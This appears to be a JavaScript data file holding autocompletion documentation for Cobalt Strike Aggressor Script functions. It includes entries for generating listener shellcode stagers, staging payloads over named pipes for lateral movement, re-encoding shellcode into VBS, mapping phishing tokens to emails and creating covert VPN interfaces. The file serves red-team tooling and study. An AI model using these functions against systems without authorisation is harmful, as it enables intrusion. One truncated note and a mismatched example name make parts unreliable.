\`\`\`
ssh_alias echo {
blog($1, "You typed: " . substr($1, 5));
}

ssh_command_group(
"ssh_help_group_id",
"My SSH Help Group Name",
"This is my example ssh help group");

ssh_command_register(
"echo", 
"echo posts to the current session's log", 
"Synopsis: echo [arguments]\\n\\nLog arguments to the SSH console");
"ssh_help_group_id");
\`\`\``,
    anchors: ["ssh_command_register"],
  },
  "ssh_commands": {
    name: "ssh_commands",
    detail: "Get a list of SSH commands",
    documentation: `Get a list of SSH commands.

**Returns:** An array of SSH commands.

**Example:**
\`\`\`
printAll(ssh_commands());
\`\`\``,
    anchors: ["ssh_commands"],
  },
  "stager": {
    name: "stager",
    detail: "stager($1, $2)",
    documentation: `Returns the stager for a specific Cobalt Strike listener

**Arguments:**
- \`$1\` — the listener name
- \`$2\` — x86|x64 - the architecture of the stager output.

**Returns:** A scalar containing shellcode for the specified listener.

**Note:** Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.

**Example:**
\`\`\`
$data = stager("my-listener", "x86");

$handle = openf(">out.bin");
writeb($handle, $data);
closef($handle);
\`\`\``,
    anchors: ["stager"],
  },
  "stager_bind_pipe": {
    name: "stager_bind_pipe",
    detail: "stager_bind_pipe($1)",
    documentation: `Returns a bind_pipe stager for a specific Cobalt Strike listener. This stager is suitable for use in lateral movement actions that benefit from a small named pipe stager. Stage with &beacon_stage_pipe.

**Arguments:**
- \`$1\` — the listener name

**Returns:** A scalar containing x86 bind_pipe shellcode.

**Example:**
\`\`\`
# step 1. generate our stager
$stager = stager_bind_pipe("my-listener");

# step 2. do something to run our stager

# step 3. stage a payload via this stager
beacon_stage_pipe($bid, $target, "my-listener", "x86");

# step 4. assume control of the payload (if needed)
beacon_link($bid, $target, "my-listener");

See also

&artifact_general
\`\`\``,
    anchors: ["stager_bind_pipe"],
  },
  "stager_bind_tcp": {
    name: "stager_bind_tcp",
    detail: "stager_bind_tcp($1, $2, $3)",
    documentation: `Returns a bind_tcp stager for a specific Cobalt Strike listener. This stager is suitable for use in localhost-only actions that require a small stager. Stage with &beacon_stage_tcp.

**Arguments:**
- \`$1\` — the listener name
- \`$2\` — x86|x64 - the architecture of the stager output.
- \`$3\` — the port to bind to

**Returns:** A scalar containing bind_tcp shellcode

**Example:**
\`\`\`
# step 1. generate our stager
$stager = stager_bind_tcp("my-listener", "x86", 1234);

# step 2. do something to run our stager

# step 3. stage a payload via this stager
beacon_stage_tcp($bid, $target, 1234, "my-listener", "x86");

# step 4. assume control of the payload (if needed)
beacon_link($bid, $target, "my-listener");

See also

&artifact_general
\`\`\``,
    anchors: ["stager_bind_tcp"],
  },
  "str_chunk": {
    name: "str_chunk",
    detail: "str_chunk($1, $2)",
    documentation: `Chunk a string into multiple parts

**Arguments:**
- \`$1\` — the string to chunk
- \`$2\` — the maximum size of each chunk

**Returns:** The original string split into multiple chunks

**Example:**
\`\`\`
# hint... :)
else if ($1 eq "template.x86.ps1") {
local('$enc');
$enc = str_chunk(base64_encode($2), 61);
return strrep($data, '%%DATA%%', join("' + '", $enc));
}
\`\`\``,
    anchors: ["str_chunk"],
  },
  "str_decode": {
    name: "str_decode",
    detail: "str_decode($1, $2)",
    documentation: `Convert a string of bytes to text with the specified encoding.

**Arguments:**
- \`$1\` — the string to decode
- \`$2\` — the encoding to use.

**Returns:** The decoded text.

**Example:**
\`\`\`
# convert back to a string we can use (from UTF16-LE)
$text = str_decode($string, "UTF16-LE");
\`\`\``,
    anchors: ["str_decode"],
  },
  "str_encode": {
    name: "str_encode",
    detail: "str_encode($1, $2)",
    documentation: `Convert text to byte string with the specified character encoding.

**Arguments:**
- \`$1\` — the string to encode
- \`$2\` — the encoding to use

**Returns:** The resulting string.

**Example:**
\`\`\`
# convert to UTF16-LE
$encoded = str_encode("this is some text", "UTF16-LE");
\`\`\``,
    anchors: ["str_encode"],
  },
  "str_xor": {
    name: "str_xor",
    detail: "str_xor($1, $2)",
    documentation: `Walk a string and XOR it with the provided key.

**Arguments:**
- \`$1\` — the string to mask
- \`$2\` — the key to use (string)

**Returns:** The original string masked with the specified key.

**Example:**
\`\`\`
$mask = str_xor("This is a string", "key");
$plain = str_xor($mask, "key");
\`\`\``,
    anchors: ["str_xor"],
  },
  "sync_download": {
    name: "sync_download",
    detail: "sync_download($1, $2, $3)",
    documentation: `Sync a downloaded file (View -> Downloads) to a local path.

**Arguments:**
- \`$1\` — the remote path to the file to sync. See &downloads
- \`$2\` — where to save the file locally
- \`$3\` — (optional) a callback function to execute when download is synced. The first argument to this function is the local path of the downloaded file.

**Example:**
\`\`\`
# sync all downloads
command ga {
local('$download $lpath $name $count');
foreach $count => $download (downloads()) {
($lpath, $name) = values($download, @("lpath", "name"));

sync_download($lpath, script_resource("file $+ .$count"), lambda({ 
println("Downloaded $1 [ $+ $name $+ ]"); 
}, \\$name));
}
}
\`\`\``,
    anchors: ["sync_download"],
  },
  "targets": {
    name: "targets",
    detail: "Returns a list of host information in Cobalt Strike's data model",
    documentation: `Returns a list of host information in Cobalt Strike's data model.

**Returns:** An array of dictionary objects with information about each host.

**Example:**
\`\`\`
printAll(targets());
\`\`\``,
    anchors: ["targets"],
  },
  "tbrowser": {
    name: "tbrowser",
    detail: "Generate the target browser GUI component",
    documentation: `Generate the target browser GUI component.

**Returns:** The target browser GUI object (a javax.swing.JComponent)

**Example:**
\`\`\`
addVisualization("Target Browser", tbrowser());

See also

&showVisualization
\`\`\``,
    anchors: ["tbrowser"],
  },
  "tokenToEmail": {
    name: "tokenToEmail",
    detail: "tokenToEmail($1)",
    documentation: `Covert a phishing token to an email address.

**Arguments:**
- \`$1\` — the phishing token

**Returns:** The email address or "unknown" if the token is not associated with an email.

**Example:**
\`\`\`
set PROFILER_HIT {
local('$out $app $ver $email');
$email = tokenToEmail($5); 
$out = "\\c9[+]\\o $1 $+ / $+ $2 [ $+ $email $+ ] Applications";
foreach $app => $ver ($4) {
$out .= "\\n\\t $+ $[25]app $ver";
}
return "$out $+ \\n\\n";
}
\`\`\``,
    anchors: ["tokenToEmail"],
  },
  "transform": {
    name: "transform",
    detail: "transform($1, $2)",
    documentation: `Transform shellcode into another format.

**Arguments:**
- \`$1\` — the shellcode to transform
- \`$2\` — the transform to apply

**Returns:** The shellcode after the specified transform is applied

**Example:**
\`\`\`
println(transform("This is a test!", "veil"));
\`\`\``,
    anchors: ["transform"],
  },
  "transform_vbs": {
    name: "transform_vbs",
    detail: "transform_vbs($1, $2)",
    documentation: `Transform shellcode into a VBS expression that results in a string

**Arguments:**
- \`$1\` — the shellcode to transform
- \`$2\` — the maximum length of a plaintext run

**Returns:** The shellcode after this transform is applied

**Note:** - Previously, Cobalt Strike would embed its stagers into VBS files as several Chr() calls concatenated into a string. 

- Cobalt Strike 3.9 introduced features that required larger stagers. These larger stagers were too big to embed into a VBS file with the above method.

- To get past this VBS limi

**Example:**
\`\`\`
println(transform_vbs("This is a test!", "3"));
\`\`\``,
    anchors: ["transform_vbs"],
  },
  "tstamp": {
    name: "tstamp",
    detail: "tstamp($1)",
    documentation: `Format a time into a date/time value. This value does not include seconds.

**Arguments:**
- \`$1\` — the time [milliseconds since the UNIX epoch]

**Example:**
\`\`\`
println("The time is now: " . tstamp(ticks()));

See also

&dstamp
\`\`\``,
    anchors: ["tstamp"],
  },
  "unbind": {
    name: "unbind",
    detail: "unbind($1)",
    documentation: `Remove a keyboard shortcut binding.

**Arguments:**
- \`$1\` — the keyboard shortcut

**Example:**
\`\`\`
# restore default behavior of Ctrl+Left and Ctrl+Right
unbind("Ctrl+Left");
unbind("Ctrl+Right");

See also

&bind
\`\`\``,
    anchors: ["unbind"],
  },
  "url_open": {
    name: "url_open",
    detail: "url_open($1)",
    documentation: `Open a URL in the default browser.

**Arguments:**
- \`$1\` — the URL to open

**Example:**
\`\`\`
command go {
url_open("https://www.cobaltstrike.com/");
}
\`\`\``,
    anchors: ["url_open"],
  },
  "users": {
    name: "users",
    detail: "Returns a list of users connected to this team server",
    documentation: `Returns a list of users connected to this team server.

**Returns:** An array of users.

**Example:**
\`\`\`
foreach $user (users()) {
println($user);
}
\`\`\``,
    anchors: ["users"],
  },
  "vpn_interface_info": {
    name: "vpn_interface_info",
    detail: "vpn_interface_info($1, $2)",
    documentation: `Get information about a VPN interface.

**Arguments:**
- \`$1\` — the interface name
- \`$2\` — [Optional] the key to extract a value for

**Returns:** %info = vpn_interface_info("interface");

Returns a dictionary with the metadata for this interface.

$value = vpn_interface_info("interface", "key");

Returns the value for the specified key from this interface's metadata

**Example:**
\`\`\`
# create a script console alias to interface info
command interface {
println("Interface $1");
foreach $key => $value (vpn_interface_info($1)) {
println("$[15]key $value");
}
}
\`\`\``,
    anchors: ["vpn_interface_info"],
  },
  "vpn_interfaces": {
    name: "vpn_interfaces",
    detail: "Return a list of VPN interface names",
    documentation: `Return a list of VPN interface names

**Returns:** An array of interface names.

**Example:**
\`\`\`
printAll(vpn_interfaces());
\`\`\``,
    anchors: ["vpn_interfaces"],
  },
  "vpn_tap_create": {
    name: "vpn_tap_create",
    detail: "vpn_tap_create($1, $2, $3, $4, $5)",
    documentation: `Create a Covert VPN interface on the team server system.

**Arguments:**
- \`$1\` — the interface name (e.g., phear0)
- \`$2\` — the MAC address ($null will make a random MAC address)
- \`$3\` — reserved; use $null for now.
- \`$4\` — the port to bind the VPN's channel to
- \`$5\` — the type of channel [bind, http, icmp, reverse, udp]

**Example:**
\`\`\`
vpn_tap_create("phear0", $null, $null, 7324, "udp");
\`\`\``,
    anchors: ["vpn_tap_create"],
  },
  "vpn_tap_delete": {
    name: "vpn_tap_delete",
    detail: "vpn_tap_delete($1)",
    documentation: `Destroy a Covert VPN interface

**Arguments:**
- \`$1\` — the interface name (e.g., phear0)

**Example:**
\`\`\`
vpn_tap_destroy("phear0");

Back to Top

Copyright © Fortra, LLC and its group of companies.
All trademarks and registered trademarks are the property of their respective owners.
4.12 | 202512020845 | December 2025
\`\`\``,
    anchors: ["vpn_tap_delete"],
  },
};

// Total: 421 official functions from CS documentation